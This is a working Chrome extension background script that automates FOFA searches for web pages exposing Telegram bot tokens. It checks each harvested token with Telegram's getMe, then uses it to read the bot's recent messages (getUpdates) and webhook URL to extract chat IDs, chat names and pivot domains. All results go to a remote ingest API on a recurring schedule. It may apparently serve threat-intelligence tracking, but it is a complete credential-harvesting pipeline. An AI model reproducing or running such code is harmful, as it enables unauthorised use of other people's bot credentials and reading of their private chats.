// --- CONFIGURATION ---
const BASE_QUERY_TEMPLATE = 'body="api.telegram.org/bot"';
const COUNTRY_CODES = [
    "US", "CN", "HK", "RU", "FR", "DE", "NL", "SG", "GB", "JP",
    "KR", "IN", "BR", "CA", "AU", "IT", "ES", "TR", "UA", "VN",
    "ID", "PL", "SE", "CH", "NO", "FI", "DK", "IE", "AT", "CZ",
    "RO", "ZA", "MX", "AR", "CO", "CL", "MY", "TH", "PH", "PK",
    "IR", "SA", "AE", "IL", "GR", "PT", "BE", "HU", "NZ"
];

// Target max tokens in state.results to avoid hitting the 5 MB
// chrome.storage.local limit. Oldest entries are dropped only after upload.
const MAX_STORED_RESULTS = 300;

// Max concurrent getMe validation calls (keeps Telegram rate-limit happy)
const VALIDATE_CONCURRENCY = 5;

// A FOFA login lasts 30 days (fofa_token Max-Age=720h) and the server does not
// slide it on activity, so stop before the cookie dies instead of scanning
// country after country with a dead session.
const FOFA_SESSION_URL = "https://fofa.info/";
const FOFA_SESSION_WARN_DAYS = 2;
const DEFAULT_API_URL = "https://winnethepooh.hong-yi.me";

// In-Chrome schedule for the extension lane. The alarm survives service-worker
// restarts; the Playwright lane runs on its own host timer.
const AUTO_SCAN_ALARM = "auto_scan";
const AUTO_SCAN_PERIOD_MINUTES = 240;

// --- STATE ---
let state = {
    isRunning: false,
    isPaused: false,
    status: "Ready",
    query: BASE_QUERY_TEMPLATE,
    domain: "en.fofa.info",
    domainMode: "en",        // "en" | "cn" | "both"
    domainPhase: 1,          // 1 = first domain, 2 = second domain (both mode only)
    countryIndex: 0,
    countriesDone: 0,
    resultsFound: 0,
    resultsValid: 0,
    results: [],
    seenTokens: new Set(),
    countryList: [],
};

let activeTabId = null;
const stateReady = loadState().then(() => {
    restoreActiveTab();
    recoverRunningScan();
}).catch((err) => {
    console.warn("[BG] state restore failed:", err);
});

// Restore activeTabId from storage on SW restart
function restoreActiveTab() {
    chrome.storage.local.get(["activeTabId"], (r) => {
        if (r.activeTabId) {
            activeTabId = r.activeTabId;
            // Verify the tab still exists — clear if it doesn't
            chrome.tabs.get(activeTabId, (tab) => {
                if (chrome.runtime.lastError || !tab || !isFofaUrl(tab.url)) {
                    activeTabId = null;
                    chrome.storage.local.remove("activeTabId");
                }
            });
        }
    });
}

// Re-entry after SW restart: if a scan was running, kick it back into action
// Chrome kills the SW after ~30s idle; on next alarm/event it restarts cold.
// State and activeTabId are restored from storage above — but alarms are gone.
// We recreate the watchdog and re-trigger processing if no alarm is pending.
function recoverRunningScan() {
    chrome.storage.local.get(["activeTabId"], (r) => {
        if (!state.isRunning || state.isPaused) return;
        // Recreate watchdog alarm (idempotent — Chrome dedupes by name)
        chrome.alarms.create("watchdog", { periodInMinutes: 3 });
        // Check if scrape_page alarm is already pending; if not, fire next country
        chrome.alarms.get("scrape_page", (alarm) => {
            if (!alarm && r.activeTabId) {
                // Give tab 1s to settle after SW restart, then check its state
                setTimeout(() => {
                    chrome.tabs.get(r.activeTabId, (tab) => {
                        if (chrome.runtime.lastError || !tab) return;
                        if (tab.status === "complete") {
                            // Page already loaded — send SCRAPE_PAGE directly
                            chrome.tabs.sendMessage(r.activeTabId, { action: "SCRAPE_PAGE" })
                                .catch(() => pauseScan("⚠️ FOFA tab not reachable — reload the page, then click Resume"));
                        }
                        // If tab is still loading, onUpdated will fire and create the alarm
                    });
                }, 1000);
            }
        });
    });
}

// --- LANE / SESSION HELPERS ---

function isFofaUrl(url) {
    return !!url && /^https:\/\/(en\.)?fofa\.info\//.test(url);
}

function publishLaneDomain(domain) {
    chrome.cookies.set({
        url:            "https://fofa.info/",
        name:           "th_fofa_lane_domain",
        value:          domain === "fofa.info" ? "cn" : "en",
        path:           "/",
        secure:         true,
        sameSite:       "lax",
        expirationDate: Math.floor(Date.now() / 1000) + 86400,
    }).catch((err) => console.warn("[BG] could not publish lane domain:", err.message));
}

function handleLoginRequired() {
    if (!state.isRunning || state.isPaused) return;
    if (!state.loginFallbackTried) {
        state.loginFallbackTried = true;
        const oldDomain = state.domain;
        const nextDomain = oldDomain === "fofa.info" ? "en.fofa.info" : "fofa.info";
        notifyOperators(
            `🔁 FOFA ${oldDomain === "fofa.info" ? "CN" : "EN"} login required — ` +
            `extension switched to ${nextDomain === "fofa.info" ? "CN" : "EN"} for this run.`
        );
        state.domain = nextDomain;
        state.domainMode = nextDomain === "fofa.info" ? "cn" : "en";
        state.domainPhase = 1;
        state.status = "🔒 Login required — switching to the other FOFA domain...";
        saveState();
        broadcastState();
        publishLaneDomain(nextDomain);
        processNextCountry();
        return;
    }
    pauseScan("🔒 Login required on CN and EN — log in then click Resume");
}

async function ensureOtherDomainTab(tab, domain) {
    const other = domain === "fofa.info" ? "en.fofa.info" : "fofa.info";
    const prefix = `https://${other}/`;
    const tabs = await chrome.tabs.query({ windowId: tab.windowId });
    const present = tabs.some((t) => (t.url || t.pendingUrl || "").startsWith(prefix));
    if (!present) {
        await chrome.tabs.create({
            windowId: tab.windowId,
            url:      prefix,
            active:   false,
        }).catch((err) => console.warn("[BG] could not open FOFA companion tab:", err.message));
    }
}

async function consolidateFofaWindow(windowId) {
    const tabs = await chrome.tabs.query({ url: ["https://fofa.info/*", "https://en.fofa.info/*"] });
    for (const tab of tabs) {
        if (tab.windowId !== windowId) {
            await chrome.tabs.move(tab.id, { windowId, index: -1 }).catch(() => {});
        }
    }
}

async function ensureFofaWindow(tab, domain) {
    await consolidateFofaWindow(tab.windowId);
    await ensureOtherDomainTab(tab, domain);
}

function readConfig() {
    return new Promise((resolve) => {
        chrome.storage.local.get(["supabase_config"], (r) => resolve(r.supabase_config || {}));
    });
}

// Post to the API so the message lands in the Telegram System Logs topic.
// A 503 means the broadcaster rate-limited us (2 s global cooldown); retry once.
async function notifyOperators(message) {
    const cfg = await readConfig();
    const apiUrl = (cfg.apiUrl || DEFAULT_API_URL).trim().replace(/\/+$/, "");
    const headers = { "Content-Type": "application/json" };
    if (cfg.monitorKey) headers["X-Monitor-Key"] = cfg.monitorKey.trim();

    for (let attempt = 0; attempt < 2; attempt++) {
        try {
            const res = await fetch(`${apiUrl}/monitor/ops/system-log`, {
                method:  "POST",
                headers,
                body:    JSON.stringify({ message: message.slice(0, 3900) }),
            });
            if (res.ok) return true;
            if (res.status !== 503) return false;
        } catch (err) {
            if (attempt === 1) {
                console.warn("[BG] System Logs notify failed:", err.message);
                return false;
            }
        }
        await new Promise((r) => setTimeout(r, 2500));
    }
    return false;
}

function sessionIssue(cookie, now = Date.now()) {
    if (!cookie) {
        return "🔒 FOFA session cookie not found — log in to FOFA, then start again";
    }
    if (typeof cookie.expirationDate !== "number") {
        return "⚠️ FOFA session cookie is session-only — log in again so it survives a restart";
    }
    const daysLeft = (cookie.expirationDate * 1000 - now) / 86400000;
    if (daysLeft <= 0) {
        return "🔒 FOFA session expired — log in to FOFA, then start again";
    }
    if (daysLeft < FOFA_SESSION_WARN_DAYS) {
        const days = Math.max(1, Math.ceil(daysLeft));
        const expires = new Date(cookie.expirationDate * 1000)
            .toISOString().slice(0, 16).replace("T", " ");
        return `⚠️ FOFA session expires in ${days} day(s) (${expires} UTC) — log in again soon`;
    }
    return null;
}

async function checkFofaSession() {
    try {
        const cookie = await chrome.cookies.get({ url: FOFA_SESSION_URL, name: "fofa_token" });
        return sessionIssue(cookie);
    } catch (err) {
        console.warn("[BG] FOFA cookie check failed:", err.message);
        return null;
    }
}

// Each lane opens its own tab in its own window. Never take over the tab the
// Playwright lane (or the user) is driving.
async function ensureScanTab(domain) {
    if (activeTabId) {
        const existing = await chrome.tabs.get(activeTabId).catch(() => null);
        if (existing && (isFofaUrl(existing.url) || isFofaUrl(existing.pendingUrl))) {
            return existing;
        }
        activeTabId = null;
        chrome.storage.local.remove("activeTabId");
    }

    // Reuse the existing dedicated FOFA window (prefer the one with both
    // domains) instead of spawning a second lane window after every stop.
    const fofaTabs = await chrome.tabs.query({ url: ["https://fofa.info/*", "https://en.fofa.info/*"] });
    if (fofaTabs.length) {
        const counts = new Map();
        for (const tab of fofaTabs) {
            counts.set(tab.windowId, (counts.get(tab.windowId) || 0) + 1);
        }
        const windowId = [...counts.entries()].sort((a, b) => b[1] - a[1])[0][0];
        const prefix = `https://${domain}/`;
        const same = fofaTabs.find(
            (tab) => tab.windowId === windowId && (tab.url || tab.pendingUrl || "").startsWith(prefix)
        );
        if (same) {
            activeTabId = same.id;
            chrome.storage.local.set({ activeTabId: same.id });
            return same;
        }
        const created = await chrome.tabs.create({ windowId, url: prefix, active: false });
        activeTabId = created.id;
        chrome.storage.local.set({ activeTabId: created.id });
        return created;
    }

    const created = await chrome.windows.create({
        url:     `https://${domain}/`,
        focused: false,
        type:    "normal",
    });
    const tab = created && created.tabs && created.tabs[0];
    if (!tab) return null;
    activeTabId = tab.id;
    chrome.storage.local.set({ activeTabId: tab.id });
    return tab;
}

function ensureAutoScanAlarm() {
    chrome.alarms.get(AUTO_SCAN_ALARM, (alarm) => {
        if (!alarm) {
            chrome.alarms.create(AUTO_SCAN_ALARM, { periodInMinutes: AUTO_SCAN_PERIOD_MINUTES });
        }
    });
}

async function autoScanTick() {
    await stateReady;
    const cfg = await readConfig();
    if (cfg.autoScan === false) return;

    if (state.isRunning && state.isPaused) {
        if (!(await checkFofaSession())) await resumeScan();
        return;
    }
    if (state.isRunning) return;

    await startScan(cfg.query || BASE_QUERY_TEMPLATE, undefined, cfg.domainMode || "both");
}

// --- LISTENERS ---
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    switch (msg.action) {
        case "GET_STATE":
            stateReady.then(() => {
                sendResponse(serializeState(state, { includeResults: !!msg.includeResults }));
            });
            return true;
        case "START_SCAN":
            stateReady.then(() => startScan(msg.query, msg.domain, msg.domainMode));
            break;
        case "STOP_SCAN":
            stateReady.then(() => stopScan("Stopped by user"));
            break;
        case "RESUME_SCAN":
            stateReady.then(() => resumeScan());
            break;
        case "UPLOAD_RESULTS":
            stateReady.then(() => uploadToSupabase());
            break;
        case "CAPTCHA_DETECTED":
            pauseScan("⚠️ Captcha Detected!");
            break;
        case "LOGIN_REQUIRED":
            handleLoginRequired();
            break;
        case "QUOTA_EXHAUSTED":
            pauseScan("💳 FOFA monthly free quota exhausted — recharge F-coins, then click Resume");
            break;
        case "RESULTS_FOUND":
            // Batch: msg.data is an array of {token, chatId} objects
            stateReady.then(() => handleResults(msg.data || []));
            break;
        case "PAGE_COMPLETE":
            stateReady.then(() => nextCountry());
            break;
        case "LOG":
            console.log("[Content]", msg.message);
            break;
    }
    return false;
});

// --- PERSISTENCE ---

function saveState() {
    const storageState = {
        ...state,
        seenTokens: Array.from(state.seenTokens),
    };
    chrome.storage.local.set({ scraper_state: storageState }, () => {
        if (chrome.runtime.lastError) {
            console.warn("[BG] saveState failed:", chrome.runtime.lastError.message);
            // Storage full — upload before trimming results, then retry once
            if (state.results.length > 50) {
                const resultsToUpload = state.results.slice();
                uploadToSupabase({ persistState: false }).then((uploaded) => {
                    if (!uploaded) {
                        console.warn("[BG] saveState retry skipped — upload failed; results retained");
                        return;
                    }

                    const uploadedTokens = new Set(resultsToUpload.map((result) => result.token));
                    const keepTokens = new Set(resultsToUpload.slice(-50).map((result) => result.token));
                    state.results = state.results.filter((result) =>
                        !uploadedTokens.has(result.token) || keepTokens.has(result.token)
                    );
                    saveState();
                });
            }
        }
    });
}

function loadState() {
    return new Promise((resolve) => {
        chrome.storage.local.get(["scraper_state"], (result) => {
            if (result.scraper_state) {
                const loaded = result.scraper_state;
                loaded.seenTokens = loaded.seenTokens
                    ? new Set(loaded.seenTokens)
                    : new Set();
                // Guard: countryList must exist and be consistent with countryIndex.
                // Service worker restarts can reload an old state where countryList
                // is missing or shorter than countryIndex — realign here.
                if (
                    !Array.isArray(loaded.countryList) ||
                    loaded.countryList.length === 0 ||
                    loaded.countryIndex >= loaded.countryList.length
                ) {
                    loaded.countryList = [...COUNTRY_CODES].sort(() => Math.random() - 0.5);
                    loaded.countryIndex = 0;
                }
                // Keep the run alive as a paused scan so countryIndex and
                // results survive a service-worker restart.
                if (loaded.isRunning && !loaded.isPaused) {
                    loaded.isPaused = true;
                    loaded.status = "⏸ Interrupted — click Resume";
                }
                state = loaded;
            }
            resolve();
        });
    });
}

function serializeState(s, options = {}) {
    const countryTotal = s.domainMode === "both" ? COUNTRY_CODES.length * 2 : (
        Array.isArray(s.countryList) && s.countryList.length > 0 ? s.countryList.length : COUNTRY_CODES.length
    );
    const summary = {
        isRunning: s.isRunning,
        isPaused: s.isPaused,
        status: s.status,
        query: s.query,
        domain: s.domain,
        domainMode: s.domainMode,
        domainPhase: s.domainPhase,
        countryIndex: s.countryIndex,
        countriesDone: s.countriesDone,
        resultsFound: s.resultsFound,
        resultsValid: s.resultsValid,
        countryTotal,
    };

    if (!options.includeResults) return summary;

    // Return a plain object — Sets are not serialisable via sendMessage
    return {
        ...summary,
        results: s.results,
        seenTokens: Array.from(s.seenTokens),
        countryList: s.countryList,
    };
}

// --- CORE LOGIC ---

async function startScan(userQuery, userDomain, userDomainMode) {
    if (state.isRunning) return;

    const issue = await checkFofaSession();
    if (issue) {
        state.status = issue;
        saveState();
        broadcastState();
        notifyOperators(`FOFA extension scan did not start.\n${issue}`);
        return;
    }

    const shuffled = [...COUNTRY_CODES].sort(() => Math.random() - 0.5);

    // Resolve domain from mode
    const mode   = userDomainMode || "en";
    const domain = mode === "cn" ? "fofa.info" : "en.fofa.info";

    state.isRunning      = true;
    state.isPaused       = false;
    state.status         = "Starting...";
    state.query          = userQuery || BASE_QUERY_TEMPLATE;
    state.domainMode     = mode;
    state.domainPhase    = 1;
    state.domain         = domain;
    state.countryIndex   = 0;
    state.countriesDone  = 0;
    state.resultsFound   = 0;
    state.resultsValid   = 0;
    state.results        = [];
    state.seenTokens     = new Set();
    state.countryList    = shuffled;
    state.loginFallbackTried = false;

    saveState();
    publishLaneDomain(domain);

    const tab = await ensureScanTab(domain);
    if (!tab) { stopScan("Could not open a FOFA tab"); return; }
    await ensureFofaWindow(tab, domain);

    chrome.alarms.create("watchdog", { periodInMinutes: 3 });

    broadcastState();
    processNextCountry();
}

function stopScan(reason) {
    state.isRunning = false;
    state.isPaused  = false;
    state.status    = reason || "Stopped";
    // Do not clearAll: the auto_scan schedule must outlive an individual run.
    chrome.alarms.clear("watchdog");
    chrome.alarms.clear("scrape_page");
    chrome.storage.local.remove("activeTabId");
    if (activeTabId) {
        chrome.tabs.sendMessage(activeTabId, { action: "STOP_WORK" }).catch(() => {});
    }
    activeTabId = null;
    saveState();
    broadcastState();
}

function pauseScan(reason) {
    const nextStatus = reason || "Paused";
    const changed = !state.isPaused || state.status !== nextStatus;
    state.isPaused = true;
    state.status   = nextStatus;
    saveState();
    broadcastState();

    if (!changed) return;
    const total = state.countryList.length || COUNTRY_CODES.length;
    notifyOperators(
        `FOFA extension scan paused.\n` +
        `reason: ${nextStatus}\n` +
        `progress: country ${Math.min(state.countriesDone + 1, total)}/${total}, ` +
        `${state.results.length} results kept\n` +
        `action: fix the FOFA tab or session, then click Resume`
    );
}

async function resumeScan() {
    if (!state.isRunning && state.status !== "Stopped (Recovered)") return;
    if (!state.isRunning) state.isRunning = true;
    state.loginFallbackTried = false;

    const cfg = await readConfig();
    if (cfg.domainMode && cfg.domainMode !== state.domainMode) {
        state.domainMode = cfg.domainMode;
        state.domain = cfg.domainMode === "cn" ? "fofa.info" : "en.fofa.info";
        state.domainPhase = 1;
    }

    publishLaneDomain(state.domain);
    state.isPaused = false;
    state.status   = "Resuming...";
    saveState();
    broadcastState();
    chrome.alarms.create("watchdog", { periodInMinutes: 3 });

    const tab = await ensureScanTab(state.domain || "en.fofa.info");
    if (!tab) {
        stopScan("Could not open a FOFA tab to resume");
        return;
    }
    await ensureFofaWindow(tab, state.domain || "en.fofa.info");
    chrome.tabs.sendMessage(activeTabId, { action: "RESUME_WORK" }).catch(() => {
        processNextCountry();
    });
}

function nextCountry() {
    state.countryIndex++;
    state.countriesDone++;
    saveState();

    // Auto-upload every 10 countries to avoid losing data if scan stops
    if (state.countriesDone > 0 && state.countriesDone % 10 === 0 && state.results.length > 0) {
        console.log('[BG] Auto-upload checkpoint at country', state.countriesDone);
        uploadToSupabase().catch(e => console.warn('[BG] Auto-upload failed:', e));
    }

    processNextCountry();
}

async function processNextCountry() {
    if (!state.isRunning || state.isPaused) return;

    const issue = await checkFofaSession();
    if (issue) {
        pauseScan(issue);
        return;
    }

    // Guard: realign if countryList missing after SW restart
    if (!Array.isArray(state.countryList) || state.countryList.length === 0) {
        state.countryList  = [...COUNTRY_CODES].sort(() => Math.random() - 0.5);
        state.countryIndex = 0;
    }

    if (state.countryIndex >= state.countryList.length) {
        // "both" mode: after EN phase, automatically continue on CN (or vice versa)
        if (state.domainMode === "both" && state.domainPhase === 1) {
            const nextDomain = "fofa.info";
            const shuffled   = [...COUNTRY_CODES].sort(() => Math.random() - 0.5);
            state.domainPhase  = 2;
            state.domain       = nextDomain;
            publishLaneDomain(nextDomain);
            state.countryIndex = 0;
            state.countryList  = shuffled;
            state.status = `✅ EN done — switching to CN (fofa.info)...`;
            saveState();
            broadcastState();
            // Small pause so the user sees the transition message
            await new Promise(r => setTimeout(r, 1500));
            processNextCountry();
            return;
        }
        stopScan("✅ Scan Complete!");
        await uploadToSupabase();
        return;
    }

    const country = state.countryList[state.countryIndex];
    const phaseLabel = state.domainMode === "both"
        ? ` [${state.domainPhase === 1 ? "EN" : "CN"} ${state.countriesDone + 1}/${state.countryList.length}]`
        : ` (${state.countriesDone + 1}/${state.countryList.length})`;
    state.status = `Scanning: ${country}${phaseLabel}`;
    saveState();
    broadcastState();

    const fullQuery  = `${state.query} && country="${country}"`;
    const encoded    = btoa(fullQuery);
    const targetUrl  = `https://${state.domain}/result?qbase64=${encoded}`;

    // Navigate the lane's own tab — if it is gone, open a fresh one.
    try {
        await chrome.tabs.update(activeTabId, { url: targetUrl });
    } catch (e) {
        const tab = await ensureScanTab(state.domain);
        if (!tab) {
            pauseScan("⚠️ Could not open a FOFA tab — reopen FOFA then click Resume");
            return;
        }
        await chrome.tabs.update(activeTabId, { url: targetUrl });
    }
}

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (
        tabId === activeTabId &&
        changeInfo.status === "complete" &&
        state.isRunning &&
        !state.isPaused
    ) {
        chrome.alarms.create("scrape_page", { delayInMinutes: 0.083 }); // ~5s — Vue needs time to hydrate after DOM complete
    }
});

chrome.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === "scrape_page") {
        if (!state.isRunning || state.isPaused || !activeTabId) return;
        chrome.tabs.sendMessage(activeTabId, { action: "SCRAPE_PAGE" }).catch((err) => {
            console.log("SCRAPE_PAGE send failed:", err);
            // Do not advance the country: a missing content script means no
            // results were read, and skipping would silently lose the country.
            pauseScan("⚠️ FOFA tab not reachable — reload the page, then click Resume");
        });
    }

    if (alarm.name === "watchdog") {
        if (state.isRunning && !state.isPaused && activeTabId) {
            chrome.tabs.get(activeTabId, (tab) => {
                if (chrome.runtime.lastError || !tab) {
                    stopScan("Tab closed — scan stopped");
                    return;
                }
                if (tab.status === "complete") {
                    chrome.tabs.sendMessage(activeTabId, { action: "SCRAPE_PAGE" }).catch(() => {
                        pauseScan("⚠️ FOFA tab not reachable — reload the page, then click Resume");
                    });
                }
            });
        }
    }

    if (alarm.name === AUTO_SCAN_ALARM) {
        autoScanTick().catch((err) => console.warn("[BG] auto scan failed:", err));
    }
});

chrome.runtime.onInstalled.addListener(ensureAutoScanAlarm);
chrome.runtime.onStartup.addListener(ensureAutoScanAlarm);
ensureAutoScanAlarm();

// --- VALIDATION ---

async function validateToken(data) {
    const token   = data.token;
    const baseUrl = `https://api.telegram.org/bot${token}`;

    try {
        const meRes  = await fetch(`${baseUrl}/getMe`);
        const meJson = await meRes.json();

        if (!meJson.ok) {
            data.valid  = false;
            data.status = "Invalid/Revoked";
            return data;
        }

        data.valid        = true;
        data.bot_name     = meJson.result.username;
        data.bot_id       = meJson.result.id;
        data.botUsername  = meJson.result.username;

        // --- chat_id resolution: three sources in priority order ---

        // 1. getUpdates — recent messages contain chat context
        if (!data.chatId) {
            try {
                const upRes  = await fetch(`${baseUrl}/getUpdates?limit=10&allowed_updates=["message","channel_post","my_chat_member","chat_member"]`);
                const upJson = await upRes.json();
                if (upJson.ok && upJson.result) {
                    for (const update of upJson.result) {
                        const chat =
                            (update.message        && update.message.chat)        ||
                            (update.channel_post   && update.channel_post.chat)   ||
                            (update.my_chat_member && update.my_chat_member.chat) ||
                            (update.chat_member    && update.chat_member.chat);
                        if (chat) {
                            data.chatId    = chat.id;
                            data.chatType  = chat.type;
                            data.chatTitle = chat.title || chat.username || chat.first_name;
                            break;
                        }
                    }
                }
            } catch (_) {}
        }

        // 2. getWebhookInfo — webhook URL often contains chat_id or a pivot domain
        if (!data.chatId) {
            try {
                const whRes  = await fetch(`${baseUrl}/getWebhookInfo`);
                const whJson = await whRes.json();
                if (whJson.ok && whJson.result) {
                    const whUrl = whJson.result.url || "";
                    data.webhookUrl = whUrl || null;

                    // Extract chat_id embedded in common webhook URL patterns:
                    // e.g. /send?chat_id=-100123, /notify/123456789, ?cid=-100...
                    const cidMatch = whUrl.match(/[?&/](?:chat_id|cid|chatid|target)[=\/](-?\d{5,20})/i);
                    if (cidMatch) {
                        data.chatId   = cidMatch[1];
                        data.chatType = "webhook_extracted";
                    }

                    // Even without a chat_id, a non-empty webhook URL is a
                    // high-value pivot point — record it for the backend pivot tasks
                    if (whUrl && !data.webhookDomain) {
                        try {
                            data.webhookDomain = new URL(whUrl).hostname;
                        } catch (_) {}
                    }
                }
            } catch (_) {}
        }

        // 3. getChat on common supergroup ID patterns — last resort, rarely useful
        // (skipped — too slow and mostly fails without a known chat_id seed)

        return data;
    } catch (_) {
        data.valid  = false;
        data.status = "Network/Error";
        return data;
    }
}

// Validate a batch of raw token objects concurrently (capped at VALIDATE_CONCURRENCY)
async function validateBatch(rawItems) {
    const results = [];
    // Process in chunks of VALIDATE_CONCURRENCY
    for (let i = 0; i < rawItems.length; i += VALIDATE_CONCURRENCY) {
        const chunk     = rawItems.slice(i, i + VALIDATE_CONCURRENCY);
        const validated = await Promise.all(chunk.map((item) => validateToken(item)));
        results.push(...validated);
    }
    return results;
}

// Handle a batch of results arriving from content.js
async function makeRoomForResults(additionalCount) {
    const excess = state.results.length + additionalCount - MAX_STORED_RESULTS;
    if (excess <= 0) return;

    const uploadedResults = state.results.slice();
    const resultsToRemove = uploadedResults.slice(0, excess);
    const uploaded = await uploadToSupabase({ persistState: false });
    if (!uploaded) return;

    const uploadedTokens = new Set(resultsToRemove.map((result) => result.token));
    let removed = 0;
    state.results = state.results.filter((result) => {
        if (removed < excess && uploadedTokens.has(result.token)) {
            removed++;
            return false;
        }
        return true;
    });
}

async function handleResults(items) {
    if (!state.isRunning && state.status !== "Paused") return;

    // Dedup against already-seen tokens
    const newItems = items.filter((d) => {
        if (!d.token || state.seenTokens.has(d.token)) return false;
        state.seenTokens.add(d.token);
        return true;
    });

    if (newItems.length === 0) return;

    const additionalCount = newItems.filter(
        (item) => !state.results.some((result) => result.token === item.token)
    ).length;
    await makeRoomForResults(additionalCount);

    // Save raw tokens immediately before validation — survives SW death mid-batch
    for (const item of newItems) {
        // Placeholder entry: valid=null means "found but not yet validated"
        if (!state.results.find(r => r.token === item.token)) {
            state.results.push({ ...item, valid: null });
            state.resultsFound++;
        }
    }
    saveState();

    state.status = `Validating ${newItems.length} token(s)...`;
    broadcastState();

    const validated = await validateBatch(newItems);

    for (const v of validated) {
        // Update the placeholder entry saved before validation
        const existing = state.results.findIndex(r => r.token === v.token);
        if (existing >= 0) {
            state.results[existing] = v; // replace placeholder with full validated data
        } else {
            // Fallback: shouldn't happen, but still preserve the result if upload fails
            await makeRoomForResults(1);
            state.results.push(v);
            state.resultsFound++;
        }
        if (v.valid) state.resultsValid++;
        console.log("🦅 CREDENTIAL:", v.valid ? "✅" : "❌", v.token.slice(0, 12) + "...", v.bot_name || "");
    }

    saveState();
    broadcastState();
}

function broadcastState() {
    chrome.runtime.sendMessage({ action: "STATE_UPDATE", state: serializeState(state) }).catch(() => {});
}

// --- SUPABASE UPLOAD ---
// Always routes via the API endpoint (server-side Fernet encryption).
// Direct Supabase write removed — it stored raw plaintext tokens with no
// encryption path, creating a permanent security hole in the DB.

async function uploadToSupabase({ persistState = true } = {}) {
    // Send ALL found results — valid, invalid, and unvalidated
    // The backend re-validates via enrich_credential anyway
    const allResults = (state.results || []);
    if (allResults.length === 0) {
        state.status = "⚠️ Nothing to upload (no tokens found)";
        if (persistState) saveState();
        broadcastState();
        return false;
    }

    const cfg = await readConfig();

    const apiUrl          = (cfg.apiUrl          || "").trim().replace(/\/+$/, "");
    const monitorKey      = (cfg.monitorKey       || "").trim();

    if (!apiUrl) {
        state.status = "⚠️ Upload skipped — set API URL in settings";
        if (persistState) saveState();
        broadcastState();
        return false;
    }

    state.status = `⬆️ Uploading ${allResults.length} tokens via API...`;
    if (persistState) saveState();
    broadcastState();

    const payload = {
        source:  "extension",
        domain:  state.domain,
        query:   state.query,
        results: allResults.map((r) => ({
            token:        r.token,
            chat_id:      r.chatId        || null,
            chat_name:    r.chatTitle      || null,
            chat_type:    r.chatType       || null,
            bot_id:       r.bot_id         ? String(r.bot_id) : null,
            bot_username: r.botUsername    || r.bot_name || null,
            valid:        r.valid,
            meta: {
                domain:         state.domain,
                query:          state.query,
                webhook_url:    r.webhookUrl    || null,
                webhook_domain: r.webhookDomain || null,
            },
        })),
    };

    const headers = { "Content-Type": "application/json" };
    if (monitorKey) headers["X-Monitor-Key"] = monitorKey;

    let uploaded = false;
    try {
        // Retry up to 3 times with exponential backoff (network hiccups, API restart)
        let lastErr = null;
        for (let attempt = 0; attempt < 3; attempt++) {
            try {
                const controller = new AbortController();
                const timeout    = setTimeout(() => controller.abort(), 60000);
                const res = await fetch(`${apiUrl}/ingest/extension/credentials`, {
                    method:  "POST",
                    headers,
                    body:    JSON.stringify(payload),
                    signal:  controller.signal,
                });
                clearTimeout(timeout);

                if (res.ok) {
                    const data   = await res.json().catch(() => ({}));
                    state.status = `✅ Uploaded: ${data.inserted || 0} new, ${data.updated || 0} updated, ${data.skipped || 0} skipped`;
                    uploaded = true;
                    lastErr = null;
                    break;
                } else if (res.status >= 500) {
                    // Server error — retry
                    lastErr = `HTTP ${res.status}`;
                    await new Promise(r => setTimeout(r, 2000 * (attempt + 1)));
                    continue;
                } else {
                    // Client error (4xx) — don't retry
                    const text   = await res.text().catch(() => "");
                    state.status = `❌ Upload failed (HTTP ${res.status}) — check API URL & monitor key`;
                    console.warn("Upload failed:", res.status, text);
                    lastErr = null;
                    break;
                }
            } catch (fetchErr) {
                lastErr = fetchErr.message;
                if (attempt < 2) await new Promise(r => setTimeout(r, 3000 * (attempt + 1)));
            }
        }
        if (lastErr) {
            state.status = `❌ Upload failed after 3 attempts: ${lastErr}`;
            console.warn("Upload exhausted retries:", lastErr);
        }
    } catch (e) {
        state.status = `❌ Upload error: ${e.message}`;
        console.warn("Upload exception:", e);
    }

    if (persistState) saveState();
    broadcastState();
    return uploaded;
}

// Expose for CDP automation (scripts/dev/run_fofa_scan.mjs)
globalThis.startScan = startScan;
globalThis.stopScan = stopScan;
globalThis.resumeScan = resumeScan;
globalThis.state = state;

